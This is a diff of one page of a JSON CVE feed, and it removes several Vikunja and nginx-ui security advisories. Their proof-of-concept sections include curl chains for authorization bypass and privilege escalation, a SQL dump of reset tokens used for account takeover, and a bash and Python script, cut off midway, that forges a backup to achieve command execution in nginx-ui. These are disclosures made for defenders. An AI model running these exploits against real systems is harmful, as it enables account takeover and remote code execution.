@@ -1,988 +1,928 @@
 {
   "version": "1.0",
-  "lastUpdated": "2026-10-23",
+  "lastUpdated": "2026-10-24",
   "source": "CIRCL CVE Search + GitHub Advisory OSV + CISA KEV + NIST NVD",
   "pagination": {
     "page": 153,
     "pageSize": 50,
-    "totalPages": 260,
-    "totalItems": 12988,
+    "totalPages": 261,
+    "totalItems": 13026,
     "hasNextPage": true,
     "hasPrevPage": true
   },
   "cves": [
     {
-      "id": "CVE-2026-91984",
-      "summary": "## Summary\n\nThe task-position endpoint authorizes only the task side of the write: `TaskPosition.CanUpdate` delegates to `Task.CanUpdate` (write access to the task's own project) and the request body's `project_view_id` is never validated to belong to the task's project, nor is any access to that view required. Any authenticated user with a single writable task of their own can persist `(task_id, project_view_id, position)` rows into any other tenant's project view (view IDs are small sequential integers and enumerable). Low position values (below `MinPositionSpacing`, 0.01) enter the recalculation branch, but `RecalculateTaskPositions` aborts on its own project read-access check before recalculating and the whole transaction rolls back, so no cross-tenant recalculation actually executes — only the plain row insert (position ≥ 0.01) persists. This is the same root-cause pattern as GHSA-569v-q83c-3j3g (kanban bucket relocation via project_view_id mass-assignment, fixed with a dual-side check for buckets in 2.4.0) surviving in the sibling position endpoint. Verified on Vikunja 2.5.0.\n\n## Details\n\nAffected endpoints (both verified):\n\n- v1: `POST /api/v1/tasks/{id}/position`\n- v2: `PUT /api/v2/tasks/{id}/position`\n\nRoot cause in `pkg/models/task_position.go`:\n\n- `CanUpdate` (lines 61-64) checks only `Task.CanUpdate` — i.e. the caller's write access to the task's own project.\n- `updateTaskPosition` (lines 174-232) upserts `(task_id, project_view_id, position)` directly; there is no check that the view belongs to the task's project and no access check on the view's project.\n- `ProjectViewID` is body-bindable (`json:\"project_view_id\"`, no readOnly/param restriction, line 42).\n\nContrast with the fixed sibling: the bucket-move endpoint (`POST /projects/{project}/views/{view}/buckets/{bucket}/tasks`, `pkg/models/kanban_task_bucket.go:53-68`) validates both the bucket and the task after the GHSA-5pg6/GHSA-569v family fixes — the position endpoint was never given the equivalent view-side check.\n\nObserved behavior (two independent verification runs): an attacker with zero access to the victim project receives `200 {\"task_id\": ..., \"project_view_id\": <victim view>, \"position\": ...}` on both v1 and v2, and the row is persisted (verified directly in the `task_positions` table: rows for the victim view went 0 to 1). Positioning the victim's own task is correctly refused with 403, isolating the missing view-side check. The victim's listings do not surface the foreign task (no confidentiality impact demonstrated), and a low-position (< 0.01) injection enters the recalculation branch but `RecalculateTaskPositions` returns 403 (`getRelevantProjectsFromCollection` → `CanRead` on the victim project) before any recalculation runs, rolling the whole request back — so the low-position variant persists nothing and never rewrites the victim's ordering.\n\n## PoC\n\nSteps use the owner of the victim project (token `$OWNER`) and an attacker with only their own project (token `$ATTACKER`). All requests were executed against a local Vikunja 2.5.0 instance.\n\n1. Owner creates a private project (default views included) and lists its views to obtain a victim view ID:\n\n```\ncurl -X PUT \"$BASE/api/v1/projects\" -H \"Authorization: Bearer $OWNER\" \\\n  -H 'Content-Type: application/json' -d '{\"title\":\"victim\"}'\n# -> {\"id\":200,...}\n\ncurl \"$BASE/api/v1/projects/200/views\" -H \"Authorization: Bearer $OWNER\"\n# -> [{\"id\":771,\"view_kind\":\"kanban\",...}, ...]   # remember VIEW=771\n```\n\n2. Attacker creates their own project and a task in it:\n\n```\ncurl -X PUT \"$BASE/api/v1/projects\" -H \"Authorization: Bearer $ATTACKER\" \\\n  -H 'Content-Type: application/json' -d '{\"title\":\"attacker\"}'\n# -> {\"id\":201,...}\n\ncurl -X PUT \"$BASE/api/v1/projects/201/tasks\" -H \"Authorization: Bearer $ATTACKER\" \\\n  -H 'Content-Type: application/json' -d '{\"title\":\"evil\"}'\n# -> {\"id\":105,...}\n```\n\n3. Baseline — attacker positions their task in their own view (succeeds, expected):\n\n```\ncurl -X POST \"$BASE/api/v1/tasks/105/position\" -H \"Authorization: Bearer $ATTACKER\" \\\n  -H 'Content-Type: application/json' -d '{\"project_view_id\": <OWN_VIEW>, \"position\": 100}'\n# -> 200\n```\n\n4. Mutation — attacker writes their task's position into the victim's view (no access to it whatsoever):\n\n```\ncurl -X POST \"$BASE/api/v1/tasks/105/position\" -H \"Authorization: Bearer $ATTACKER\" \\\n  -H 'Content-Type: application/json' -d '{\"project_view_id\": 771, \"position\": 100}'\n# -> 200 {\"task_id\":105,\"project_view_id\":771,\"position\":100}\n\ncurl -X PUT \"$BASE/api/v2/tasks/105/position\" -H \"Authorization: Bearer $ATTACKER\" \\\n  -H 'Content-Type: application/json' -d '{\"project_view_id\": 771, \"position\": 101}'\n# -> 200 (v2 twin behaves identically)\n```\n\n5. Control — attacker positioning the victim's own task is correctly refused (the task-level gate works; only the view side is missing):\n\n```\ncurl -X POST \"$BASE/api/v1/tasks/<VICTIM_TASK>/position\" -H \"Authorization: Bearer $ATTACKER\" \\\n  -H 'Content-Type: application/json' -d '{\"project_view_id\": 771, \"position\": 1}'\n# -> 403 Forbidden\n```\n\n6. Persistence proof — the cross-tenant row exists in the database:\n\n```\ndocker exec <db> psql -U vikunja -d vikunja -t -A -c \\\n  \"SELECT task_id, position FROM task_positions WHERE project_view_id=771 AND task_id=105;\"\n# -> 105|100        (row for the attacker's task inside the victim's view namespace)\n```\n\nObserved result: steps 4 and 6 succeed — a `task_positions` row `(attacker_task, victim_view)` is created and persisted; step 5 is refused with 403. Note: `\"position\": 1` is above `MinPositionSpacing` (0.01), so it never enters the recalculation branch — it is a plain upsert. A position < 0.01 does enter the branch but is refused with 403 and rolled back (see Impact).\n\n## Impact\n\n**Impact summary:** a genuine broken-object-level-authorization defect (CWE-639) with no demonstrated confidentiality, integrity, or availability impact. The injected rows are invisible to the victim (view listings filter by project), order-preserving (any position collision is respaced between the same neighbours), and self-healing (any legitimate recalculation of the view deletes and rebuilds all its position rows). No read access, no privilege gain, no data destruction, and no usable DoS. Rated **low** — the fix is defense-in-depth, and its main value is preventing this wrong-object authorization from becoming a real cross-tenant leak should any future read path join `task_positions` without re-checking task-project access.\n\nBroken object-level authorization on the write side (CWE-639, CWE-863: the authorization decision uses one resource dimension — the task — while the write targets another — the view). Any authenticated user holding a single writable task can persist rows into any other tenant's view state instance-wide (view IDs sequential and enumerable). The recalculation/lock path is not usable cross-tenant: a low position (< 0.01) enters the branch but `RecalculateTaskPositions` fails its own project read-access check and rolls back before recalculating (on MySQL/PostgreSQL a `FOR UPDATE` lock on the view row is taken one statement earlier in the same transaction, but released immediately on that rollback; SQLite takes no lock), so there is no meaningful availability angle. No confidentiality breach was demonstrated (victim listings filter by project), and the pollution is recoverable. Suggested fix: in `CanUpdate` or before the upsert, load the view by `tp.ProjectViewID` and require `view.ProjectID == task.ProjectID` (and/or caller access to the view's project), mirroring the bucket-side fix for GHSA-569v.",
-      "cvssScore": 5.3,
+      "id": "CVE-2026-88275",
+      "summary": "GeoVision GV-LPC2211 V1.13 allows an administrator-controlled WPA-PSK containing shell syntax to execute arbitrary commands as root when wireless configuration is applied.",
+      "cvssScore": 5.5,
       "severity": "Medium",
-      "published": "2026-10-09",
-      "modified": "2026-10-09",
-      "cwe": {
-        "cwe_id": "CWE-639",
-        "name": "Authorization Bypass Through User-Controlled Key"
-      },
-      "references": [
-        "https://github.com/go-vikunja/vikunja/security/advisories/GHSA-w39f-h553-h2mx",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-91984",
-        "https://github.com/go-vikunja/vikunja/pull/3688",
-        "https://github.com/go-vikunja/vikunja/commit/077dc4de79ce6f1ab59215a2c7bf9b30423685f2",
-        "https://github.com/go-vikunja/vikunja/releases/tag/v2.6.0"
-      ],
-      "vulnerableProducts": [
-        "code.vikunja.io/api go"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-91985",
-      "summary": "## Summary\n\nA user who has only read permission on a project can call the single link-share read endpoint and receive the share's `hash` field — the secret credential that the anonymous `POST /shares/{share}/auth` endpoint exchanges for a link-share JWT carrying the share's permission (read / read-write / admin). A read-only member can therefore mint a write- or admin-level token for the project and perform writes they are not entitled to, while their own user token is correctly refused. This is the remaining variant of the link-share hash disclosure class: GHSA-8hp8-9fhr-pfm9 fixed the list endpoint (ReadAll now requires project admin) but the single-read endpoint's gate was never aligned. Verified on Vikunja 2.5.0; the weak gate has existed since the endpoint, so earlier versions are likely affected too.\n\n## Details\n\nAffected endpoints (both verified with a complete chain):\n\n- v1: `GET /api/v1/projects/{project}/shares/{share}`\n- v2: `GET /api/v2/projects/{project}/shares/{share}`\n\nPermission gate: `LinkSharing.CanRead` (`pkg/models/link_sharing_permissions.go`) delegates to `project.CanRead(s, a)` — i.e. any user with read access to the project passes. The response serializes the `hash` field (`pkg/models/link_sharing.go`, field tag `json:\"hash\"`), which is the share's bearer credential. The share `password` field is correctly cleared before returning, but the hash is not restricted.\n\nInconsistent with the sibling list endpoint `GET /projects/{project}/shares` (`LinkSharing.ReadAll`, `pkg/models/link_sharing.go:243-256`), which requires `project.IsAdmin` — the protection level the project chose when the class was fixed for the list endpoint in 2.3.0 (GHSA-8hp8). The v1 and v2 APIs share the same model-level gate (the v2 `handler.DoReadOne` wrappers call the same `CanRead`), so both surfaces are affected.\n\nImpact chain: hash -> `POST /api/v1/shares/{hash}/auth` (unauthenticated by design) -> link-share JWT at the share's permission level -> full API access at that level for that project.\n\nMitigating factors: the attacker must already be a member of the project at read level; password-protected shares (sharing_type=2) still require the password at the auth step; share IDs are small sequential integers and enumerable by members.\n\n## PoC\n\nSteps below use two accounts: the owner (token `$OWNER`) and an attacker who has been granted read-only access to the project (token `$READER`). All requests were executed against a local Vikunja 2.5.0 instance.\n\n1. Owner creates a private project and a read-write link share (permission=1):\n\n```\ncurl -X PUT \"$BASE/api/v1/projects\" -H \"Authorization: Bearer $OWNER\" \\\n  -H 'Content-Type: application/json' -d '{\"title\":\"poc\"}'\n# -> {\"id\":123,...}\n\ncurl -X PUT \"$BASE/api/v1/projects/123/shares\" -H \"Authorization: Bearer $OWNER\" \\\n  -H 'Content-Type: application/json' -d '{\"name\":\"poc\",\"permission\":1}'\n# -> {\"id\":7,\"hash\":\"<SECRET_HASH>\",...}\n```\n\n2. Owner adds the attacker as a read-only member (permission=0):\n\n```\ncurl -X PUT \"$BASE/api/v1/projects/123/users\" -H \"Authorization: Bearer $OWNER\" \\\n  -H 'Content-Type: application/json' -d '{\"username\":\"attacker\",\"permission\":0}'\n```\n\n3. Attacker reads the single share — the weak gate — and receives the hash (this is the disclosure; the list endpoint would correctly return 403 here):\n\n```\ncurl \"$BASE/api/v1/projects/123/shares/7\" -H \"Authorization: Bearer $READER\"\n# -> 200 {\"id\":7,\"hash\":\"<SECRET_HASH>\",\"permission\":1,...}\n# v2 twin behaves identically:\ncurl \"$BASE/api/v2/projects/123/shares/7\" -H \"Authorization: Bearer $READER\"\n# -> 200 {\"hash\":\"<SECRET_HASH>\",...}\n```\n\n4. Attacker exchanges the hash for a link-share JWT (no authentication required):\n\n```\ncurl -X POST \"$BASE/api/v1/shares/<SECRET_HASH>/auth\" \\\n  -H 'Content-Type: application/json' -d '{}'\n# -> 200 {\"token\":\"<LINK_JWT>\",...}\n```\n\n5. Negative control — the attacker's own user token cannot write to the project:\n\n```\ncurl -X PUT \"$BASE/api/v1/projects/123/tasks\" -H \"Authorization: Bearer $READER\" \\\n  -H 'Content-Type: application/json' -d '{\"title\":\"direct\"}'\n# -> 403 Forbidden\n```\n\n6. Escalation proof — the link-share JWT writes successfully:\n\n```\ncurl -X PUT \"$BASE/api/v1/projects/123/tasks\" -H \"Authorization: Bearer <LINK_JWT>\" \\\n  -H 'Content-Type: application/json' -d '{\"title\":\"escalated\"}'\n# -> 201 Created\n```\n\nObserved result: steps 3, 4 and 6 all succeed (200 / 200 / 201) while step 5 is refused with 403 — the read-only member has escalated to write access. If the project has an admin-level share (permission=2), the same chain yields project-admin capabilities (member management is still refused for link principals, but project settings, shares of the project, and all write operations become available).\n\n## Impact\n\nBroken access control / privilege escalation within shared projects (CWE-862, CWE-639: the link-share hash is a bearer capability disclosed to a lesser-privileged member; CWE-200 for the information exposure). Any read-level member of a project that has a link share can escalate to that share's permission level: write members' tasks/comments can be created and modified; an admin-level share additionally grants project settings and share management for the project. Confidentiality is also affected insofar as the hash itself is the project's shared secret. Suggested fix: require `project.IsAdmin` in `LinkSharing.CanRead` (aligning with `ReadAll`), or omit the `hash` field from responses to non-admin members.",
-      "cvssScore": null,
-      "severity": "High",
-      "published": "2026-10-09",
-      "modified": "2026-10-09",
-      "cwe": {
-        "cwe_id": "CWE-200",
-        "name": "Exposure of Sensitive Information to an Unauthorized Actor"
-      },
-      "references": [
-        "https://github.com/go-vikunja/vikunja/security/advisories/GHSA-qfwc-vx6f-3g6g",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-91985",
-        "https://github.com/go-vikunja/vikunja/pull/3688",
-        "https://github.com/go-vikunja/vikunja/commit/077dc4de79ce6f1ab59215a2c7bf9b30423685f2",
-        "https://github.com/go-vikunja/vikunja/releases/tag/v2.6.0"
-      ],
-      "vulnerableProducts": [
-        "code.vikunja.io/api go"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-91982",
-      "summary": "### Summary\nOnce a user has TOTP enabled, the API still hands back the raw shared secret to anyone holding that account's access token. Reading it doesn't ask for the password, even though disabling TOTP does. So a stolen token, an XSS, or a browser left open is enough to copy the second factor into your own authenticator and keep generating valid codes indefinitely.\n\n### Details\n`GET /api/v1/user/settings/totp` returns the full TOTP object, including the secret field and the otpauth:// provisioning URL. `GET /api/v1/user/settings/totp/qrcode` renders the same secret as a QR image. Neither requires re-authentication, the access token alone is enough.\n\nThis is inconsistent with the rest of the flow: `POST /api/v1/user/settings/totp/disable` calls CheckUserPassword before it will turn TOTP off. So the destructive action is gated behind the password, but reading out the secret that backs the second factor isn't. There's also no reason for the secret to be readable at all once enrollment is finished, the client only needs it during setup.\n\nThe fix is to stop returning secret/url/the QR code once enabled is true (only expose them during the enrollment window). Requiring the password on the read, like disable already does, would also be reasonable.\n\n### PoC\nThe attacker needs the victim's access token, from an XSS, a leaked/stolen token, or an unlocked session. TOTP must already be enabled on the account.\n\n1. With the victim's bearer token, call:\n```\nGET /api/v1/user/settings/totp\nAuthorization: Bearer <victim_token>\n```\nThe response contains the shared secret and the otpauth:// URL:\n```\n{\"secret\": \"<base32 secret>\", \"enabled\": true, \"url\": \"otpauth://totp/...\"}\n```\n2. Paste that secret (or scan `/api/v1/user/settings/totp/qrcode`) into any authenticator app.\n3. It now produces the same 6-digit codes as the victim's device. Nothing is logged and the victim gets no notification.\n\n### Impact\nThis defeats the purpose of the second factor. 2FA is supposed to survive exactly this situation, a compromised password or a hijacked session, but a single read of the account's own settings hands over the shared secret with no step-up check and no trace. Combined with a known or later-recovered password, it's a durable account takeover that TOTP was meant to prevent.",
-      "cvssScore": 5.3,
-      "severity": "Medium",
-      "published": "2026-10-09",
-      "modified": "2026-10-09",
-      "cwe": {
-        "cwe_id": "CWE-312",
-        "name": "Cleartext Storage of Sensitive Information"
-      },
-      "references": [
-        "https://github.com/go-vikunja/vikunja/security/advisories/GHSA-88f6-4rjv-x774",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-91982",
-        "https://github.com/go-vikunja/vikunja/pull/3688",
-        "https://github.com/go-vikunja/vikunja/releases/tag/v2.6.0",
-        "https://www.vulncheck.com/advisories/vikunja-before-2.6.0-totp-secret-disclosure-via-api"
-      ],
-      "vulnerableProducts": [
-        "code.vikunja.io/api go"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-91972",
-      "summary": "### Summary\n`registerAPIRoutesV2` never applies the unconditional pre-auth rate-limit floor (`unauthRateLimit()`) to the v2 public routes — it passes that limiter only to `/api/v2/ws` — and otherwise relies on `setupRateLimit`, which registers nothing when `ratelimit.enabled` is false (the default). So on a stock install every v2 pre-auth endpoint (login, register, password-reset token, oauth token) is unthrottled, while its v1 twin is throttled.\n\n### Details\n`unauthRateLimit()` -> `perMinuteIPRateLimit(\"noauth\", RateLimitNoAuthRoutesLimit)` (`pkg/routes/rate_limit.go`, ~lines 100-118) is an unconditional per-IP floor (default 10/60s) that deliberately ignores `RateLimitEnabled`, which is why v1's pre-auth routes are throttled even with the global limiter off. v1 applies it: `ur := a.Group(\"\"); ur.Use(unauthRateLimit())` (`pkg/routes/routes.go` ~line 459). `registerAPIRoutesV2` (~lines 405-431) passes the `unauthRateLimit()` instance only to `/api/v2/ws`; its auth routes get only `setupRateLimit(a, ...)`, which is config-gated and registers nothing by default.\n\n### PoC (verified at runtime against v2.5.0)\n```\nPOST /api/v1/login              x25 -> 429 from attempt 5\nPOST /api/v2/login              x25 -> 403 x25, 429 x0\nPOST /api/v1/user/password/token     -> 429 (throttled)\nPOST /api/v2/user/password/token x20 -> 404 x20, 429 x0\n```\nRequest bodies are byte-identical across versions (shared `user.Login` / `user.PasswordTokenRequest`). Both v2 endpoints reach their handlers (403/404, not route-404), so the comparison is valid.\n\n### Impact\nThe pre-auth rate-limit floor — the instance's only default anti-brute-force / anti-abuse control — is absent on all v2 public endpoints. Enables unbounded credential guessing, account-enumeration probing, and password-reset flooding on a default install. Reported as an authentication-control bypass, not a DoS.\n\n### Fix\nApply `unauthRateLimit()` to the v2 public route group, matching v1.",
-      "cvssScore": 8.7,
-      "severity": "High",
-      "published": "2026-10-09",
-      "modified": "2026-10-09",
-      "cwe": {
-        "cwe_id": "CWE-307",
-        "name": "Improper Restriction of Excessive Authentication Attempts"
-      },
-      "references": [
-        "https://github.com/go-vikunja/vikunja/security/advisories/GHSA-6rvj-qwjf-3m4q",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-91972",
-        "https://github.com/go-vikunja/vikunja/releases/tag/v2.6.0",
-        "https://www.vulncheck.com/advisories/vikunja-before-2.6.0-authentication-bypass-via-unthrottled-api",
-        "https://github.com/advisories/GHSA-6rvj-qwjf-3m4q"
-      ],
-      "vulnerableProducts": [
-        "code.vikunja.io/api go"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-62376",
-      "summary": "### Summary\n\nVikunja stores password-reset, email-confirmation, and account-deletion tokens in the `user_tokens` table in **plaintext**. If an attacker gains read access to the database through a backup leak, misconfigured storage, or SQL-level exposure, they can immediately use pending tokens to take over user accounts without knowing passwords.\n\n### Details\n\n`pkg/user/token.go` — `genToken()` stores the raw random string directly:\n```go\nfunc genToken(u *User, kind TokenKind) (*Token, error) {\n    tokenStr, err := utils.CryptoRandomString(tokenSize)\n    ...\n    return &Token{\n        UserID: u.ID,\n        Kind:   kind,\n        Token:  tokenStr,  // stored as-is, no hashing\n    }, nil\n}\n```\n\nLookup also uses plaintext equality:\n```go\nfunc getToken(s *xorm.Session, token string, kind TokenKind) (t *Token, err error) {\n    has, err := s.Where(\"kind = ? AND token = ?\", kind, token).Get(t)\n}\n```\n\nAffected token types:\n- `TokenPasswordReset` (`pkg/user/user_password_reset.go:120`)\n- `TokenEmailConfirm` (`pkg/user/user_create.go:101`, `pkg/user/update_email.go:88`)\n- `TokenAccountDeletion` (`pkg/user/delete.go:102`)\n\nNote: CalDAV tokens correctly use `generateHashedToken` with bcrypt — the same protection is absent for the above types.\n\n### PoC\n\n```sql\n-- Attacker with DB read dumps all pending password-reset tokens:\nSELECT u.email, t.token FROM user_tokens t\nJOIN users u ON u.id = t.user_id WHERE t.kind = 1;\n\n-- Then takes over any account:\ncurl -X POST https://vikunja.example.com/api/v1/user/password/reset \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"token\": \"<plaintext_from_db>\", \"new_password\": \"AttackerPass1!\"}'\n```\n\n### Impact\n\nAny read access to the database (leaked backup, cloud misconfiguration, secondary SQLi) allows an attacker to take over every user account with a pending reset token within the 24-hour token lifetime. Full account takeover including admin accounts.\n\n### Fix\n\nReplace `genToken` with `generateHashedToken` for `TokenPasswordReset`, `TokenEmailConfirm`, and `TokenAccountDeletion`. Update the corresponding lookup to use bcrypt comparison (`bcrypt.CompareHashAndPassword`) rather than direct SQL equality, mirroring the existing CalDAV token implementation in the same file.\n\nIf possible, please apply for a CVE number when posting.",
-      "cvssScore": 8.1,
-      "severity": "High",
-      "published": "2026-10-09",
-      "modified": "2026-10-09",
-      "cwe": {
-        "cwe_id": "CWE-312",
-        "name": "Cleartext Storage of Sensitive Information"
-      },
-      "references": [
-        "https://github.com/go-vikunja/vikunja/security/advisories/GHSA-r6w9-259g-gwrv",
-        "https://github.com/go-vikunja/vikunja/commit/00fd2c6155c01faae99be4226b931d8091fd6323",
-        "https://github.com/go-vikunja/vikunja/commit/3a0ea15d8c18ff960bc98ae39950fa7a14b0af7d",
-        "https://github.com/go-vikunja/vikunja/commit/e31ea2de5040fa63bc97cf4df63bafed3bd9ad85",
-        "https://github.com/go-vikunja/vikunja/releases/tag/v2.4.0"
-      ],
-      "vulnerableProducts": [
-        "code.vikunja.io/api go"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-62367",
-      "summary": "## Summary\n\nWith the per-provider OIDC `emailfallback` option enabled, Vikunja links an SSO login to a pre-existing **local** (username+password) account using only the `email` claim — no `email_verified` (or Microsoft `xms_edov`) check and no password check, on the unauthenticated callback. An attacker who can make the configured issuer emit a token bearing a victim's email logs in as that victim with a full session and no victim interaction (the nOAuth / Grafana CVE-2023-3128 class). The 2.3.0 fix for GHSA-8jvc-mcx6-r4cg added a TOTP gate, not an `email_verified` gate, so users without TOTP remain exposed.\n\n## Details\n\nReferences are `pkg/modules/auth/openid/openid.go` at HEAD. Identity is first resolved on the immutable `(issuer, subject)` pair (`openid.go:428`). On a subject miss with `emailfallback` on, `fallbackSearchUsers` adds an email-only lookup against local accounts:\n\n```go\n// openid.go:413\nsearches = append(searches, &user.User{Issuer: user.IssuerLocal, Email: cl.Email})\n```\n\n`getUser` resolves this via `s.Get()`, which ANDs non-zero fields -> `WHERE issuer='local' AND email=?`. Local users always have `Issuer=\"local\"` (`user_create.go:38`), so the lookup matches any local account by email alone; `getOrCreateUser` returns it and the caller mints a session — the password is never read. The `claims` struct has no `email_verified` field (`openid.go:80`) and `getClaims` never consults one; a repo-wide grep for `email_verified`/`xms_edov` returns nothing. The code already warns about this at `openid.go:388` (\"Discouraged for untrusted providers where someone can set email without verification\") — but enforces nothing.\n\n## Impact\n\nUnauthenticated takeover of any existing **local** account (read/write/delete its projects, tasks, attachments, shares), bypassing the password. Scope notes: only `issuer='local'` accounts are matched (not pure-SSO users); the attacker's `sub` is not bound to the victim record, but the attack is repeatable; TOTP users are protected by the 2.3.0 `enforceTOTPIfRequired` gate (`openid.go:250`), non-TOTP users are not.\n\n## Preconditions\n\n1. Admin enabled `emailfallback: true` (defaults false — a default install is unaffected).\n2. The configured issuer lets the attacker assert the victim's unverified email: a self-service IdP (Keycloak/Authentik/Auth0/Dex with editable email), a mixed federation, or a multi-tenant Entra `/common` app. `iss`/`aud` are pinned, but the attacker controls `email`, not the issuer.\n3. The victim has a local account.\n\nNot reachable against a single-tenant IdP that verifies email and disallows self-set addresses.\n\n## Recommended Fix\n\nAdd `email_verified` to the `claims` struct and require it `true` on the email-fallback branch before linking to a local account; reject when absent/false. For Entra also require `xms_edov` and pin multi-tenant configs to an allowed-tenant list. Fail closed on an email collision not backed by a verified email from a trusted single-tenant issuer rather than silently logging the caller in.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2026-10-09",
-      "modified": "2026-10-09",
-      "cwe": {
-        "cwe_id": "CWE-287",
-        "name": "Improper Authentication"
-      },
-      "references": [
-        "https://github.com/go-vikunja/vikunja/security/advisories/GHSA-xv7q-fvmc-jx96",
-        "https://github.com/go-vikunja/vikunja/commit/7854f2729ab72000210b61c25929678fd6901630",
-        "https://github.com/go-vikunja/vikunja/releases/tag/v2.4.0",
-        "https://github.com/advisories/GHSA-xv7q-fvmc-jx96"
-      ],
-      "vulnerableProducts": [
-        "code.vikunja.io/api go"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-107806",
-      "summary": "## Summary\n\nAn authenticated nginx-ui user can call `POST /api/restore`, upload a forged encrypted backup, restore `app.ini`, set nginx command settings such as `TestConfigCmd`, and then trigger command execution with `POST /api/nginx/test`.\n\nThis was validated on nginx-ui `2.3.11 2(523) 6c86e5a5` in the local Docker container `uozi/nginx-ui:latest`.\n\n## Impact\n\nAn authenticated user can overwrite nginx-ui application configuration and database state through restore, including protected settings that are normally not writable through the settings API. By setting nginx command fields in the restored `app.ini`, the attacker can execute commands in the nginx-ui runtime context. This affects confidentiality, integrity, and availability because the attacker can read or replace secrets, change node/JWT secrets, corrupt application state, and execute arbitrary commands.\n\n## Affected Version / Environment\n\n- Version: `nginx-ui 2.3.11 2(523) 6c86e5a5`\n- Deployment: local Docker, `uozi/nginx-ui:latest`\n- Base URL used in validation: `http://127.0.0.1:8080`\n\n## Root Cause\n\n`/api/restore` is reachable through normal authenticated-user authorization. The restore handler accepts attacker-supplied backup key material, validates the manifest with a key derived from that supplied AES key, decrypts attacker-controlled backup contents, and copies restored `app.ini` into the live nginx-ui config path.\n\nRelevant code paths:\n\n- `api/backup/router.go`: `POST /api/restore`\n- `api/backup/restore.go`: accepts `security_token` and uploaded backup file\n- `internal/backup/manifest.go`: derives backup signing key from supplied AES key\n- `internal/backup/restore.go`: `restoreNginxUIConfig` overwrites live `app.ini`\n- `internal/nginx/exec.go`: nginx command settings execute through shell-backed command paths\n\n## Proof of Concept\n\nAssumptions:\n\n- nginx-ui is already running.\n- `$TOKEN` is a valid user JWT.\n- `$CONTAINER` is the local disposable Docker container name for cleanup and evidence checks.\n\n```bash\nexport BASE='http://127.0.0.1:8080'\nexport TOKEN='<valid nginx-ui JWT>'\nexport CONTAINER='nginx-ui'\n```\n\nRun only against a disposable local instance.\n\n```bash\nset -eu\n\nTMP=$(mktemp -d)\ntrap 'rm -rf \"$TMP\"' EXIT\n\ndocker cp \"$CONTAINER\":/etc/nginx-ui/app.ini \"$TMP/app.ini.original\"\n\ncurl -sS -D \"$TMP/backup.headers\" -o \"$TMP/backup.zip\" \\\n  -H \"Authorization: $TOKEN\" \\\n  \"$BASE/api/backup\"\n\nSEC=$(awk 'BEGIN{IGNORECASE=1} /^X-Backup-Security:/{gsub(\"\\r\",\"\"); print $2}' \"$TMP/backup.headers\")\nKEY_B64=${SEC%%:*}\nIV_B64=${SEC#*:}\nKEY_HEX=$(printf '%s' \"$KEY_B64\" | base64 -d | xxd -p -c 256)\nIV_HEX=$(printf '%s' \"$IV_B64\" | base64 -d | xxd -p -c 256)\n\nmkdir -p \"$TMP/outer\" \"$TMP/inner\"\nunzip -q \"$TMP/backup.zip\" -d \"$TMP/outer\"\nopenssl enc -d -aes-256-cbc -K \"$KEY_HEX\" -iv \"$IV_HEX\" -nosalt \\\n  -in \"$TMP/outer/nginx-ui.zip\" \\\n  -out \"$TMP/nginx-ui.clear.zip\"\nunzip -q \"$TMP/nginx-ui.clear.zip\" -d \"$TMP/inner\"\n\npython3 - \"$TMP/inner/app.ini\" <<'PY'\nfrom pathlib import Path\nimport sys\n\np = Path(sys.argv[1])\ncmd = \"TestConfigCmd = printf restored-rce >/tmp/nginx-ui-restore-rce\"\nlines = p.read_text().splitlines()\nout = []\nin_nginx = False\nseen_nginx = False\nwritten = False\n\nfor line in lines:\n    s = line.strip()\n    if s.startswith(\"[\") and s.endswith(\"]\"):\n        if in_nginx and not written:\n            out.append(cmd)\n            written = True\n        in_nginx = s.lower() == \"[nginx]\"\n        seen_nginx = seen_nginx or in_nginx\n    if in_nginx and s.startswith(\"TestConfigCmd\"):\n        if not written:\n            out.append(cmd)\n            written = True\n        continue\n    out.append(line)\n\nif in_nginx and not written:\n    out.append(cmd)\nelif not seen_nginx:\n    out.extend([\"\", \"[nginx]\", cmd])\n\np.write_text(\"\\n\".join(out) + \"\\n\")\nPY\n\n(cd \"$TMP/inner\" && zip -qr \"$TMP/nginx-ui.modified.clear.zip\" .)\nopenssl enc -aes-256-cbc -K \"$KEY_HEX\" -iv \"$IV_HEX\" -nosalt \\\n  -in \"$TMP/nginx-ui.modified.clear.zip\" \\\n  -out \"$TMP/outer/nginx-ui.zip\"\n\nOUTER=\"$TMP/outer\" KEY_B64=\"$KEY_B64\" python3 <<'PY'\nfrom pathlib import Path\nimport base64\nimport hashlib\nimport hmac\nimport json\nimport os\n\nouter = Path(os.environ[\"OUTER\"])\nkey = base64.b64decode(os.environ[\"KEY_B64\"])\nmanifest = json.loads((outer / \"manifest.json\").read_text())\n\nfor entry in manifest[\"files\"]:\n    data = (outer / entry[\"name\"]).read_bytes()\n    entry[\"sha256\"] = hashlib.sha256(data).hexdigest()\n    entry[\"size\"] = len(data)\n\nmanifest[\"files\"] = sorted(manifest[\"files\"], key=lambda e: e[\"name\"])\nmanifest_bytes = json.dumps(manifest, separators=(\",\", \":\")).encode()\n(outer / \"manifest.json\").write_bytes(manifest_bytes)\n\nsigning_key = hashlib.sha256(b\"nginx-ui-backup-signing-v1:\" + key).digest()\n(outer / \"manifest.sig\").write_text(hmac.new(signing_key, manifest_bytes, hashlib.sha256).hexdigest())\nPY\n\n(cd \"$TMP/outer\" && zip -qr \"$TMP/malicious-restore.zip\" manifest.sig nginx-ui.zip nginx.zip manifest.json)\n\ncurl -sS -X POST \"$BASE/api/restore\" \\\n  -H \"Authorization: $TOKEN\" \\\n  -F \"restore_nginx=false\" \\\n  -F \"restore_nginx_ui=true\" \\\n  -F \"verify_hash=true\" \\\n  -F \"security_token=$SEC\" \\\n  -F \"backup_file=@$TMP/malicious-restore.zip\"\n\nsleep 10\nfor i in $(seq 1 80); do\n  curl -sS -o /dev/null -H \"Authorization: $TOKEN\" \"$BASE/api/settings\" && break\n  sleep 